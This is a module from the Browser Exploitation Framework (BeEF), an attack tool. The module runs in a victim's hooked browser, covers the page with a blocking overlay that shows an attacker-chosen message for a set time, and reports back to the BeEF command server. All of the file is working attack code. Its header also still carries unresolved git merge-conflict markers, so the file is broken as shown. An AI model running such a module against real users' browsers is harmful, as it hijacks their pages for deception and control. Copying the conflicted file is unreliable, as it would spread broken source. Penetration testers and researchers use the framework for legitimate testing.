//
<<<<<<< HEAD
// Copyright (c) 2006-2026Wade Alcorn - wade@bindshell.net
=======
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
>>>>>>> c308392cb3a7bf9025c661931b553d9835aacdcb
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
  var timeout = '<%= @timeout %>' * 1000;

  var blockui = function() {
    $j.blockUI({ message: decodeURIComponent(beef.encode.base64.decode('<%= Base64.strict_encode64(@message) %>')) });
    setTimeout("$j.unblockUI();", <%= @timeout %> * 1000);
  }

  blockui();
  beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=command sent');

});

